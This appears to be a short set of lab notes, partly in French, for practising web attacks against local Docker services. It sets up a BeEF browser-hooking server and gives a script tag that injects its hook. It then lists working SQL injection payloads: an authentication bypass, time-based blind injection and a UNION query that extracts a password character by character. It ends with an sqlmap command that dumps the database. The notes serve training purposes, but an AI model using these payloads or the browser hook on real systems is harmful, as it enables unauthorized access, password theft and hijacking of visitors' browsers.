    docker run -p 3306:3306 -e MYSQL_ROOT_PASSWORD=root -e MYSQL_DATABASE=quicky mysql
    docker run -p 3000:3000 -d janes/beef
    http://localhost:3000/ui/panel
    http://localhost:3000/hook.js
   
   <script src="http://localhost:3000/hook.js"></script>
   
   
   SELECT * FROM user where username = 'patrick';
   
   blabla' OR 1=1; -- commentaire
   SELECT * FROM user where username = 'blabla' OR 1=1; -- commentaire
   
   Time Based Explication
   blabla' AND BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')); -- commentaire
   SELECT * FROM user where username = 'blabla' AND BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')); -- commentaire
   
   Time Based
   blabla' UNION SELECT IF(SUBSTRING(password,1,1) = CHAR(98),BENCHMARK(5000000,ENCODE('xxx','xxxxxxxx')),null) as id, email, password, username  FROM user WHERE username = 'patrick'; -- commentaire
   SELECT * FROM user where username = 'blabla' UNION SELECT IF(SUBSTRING(password,1,1) = CHAR(98),BENCHMARK(5000000,ENCODE('xxx','xxxxxxxx')),null) as id, email, password, username FROM user WHERE username = 'patrick';
   
   Stacked Querry
   
   Union Select
   
   sqlmap -u 'http://localhost:8081/sqli/blind?input=patrick' --dump
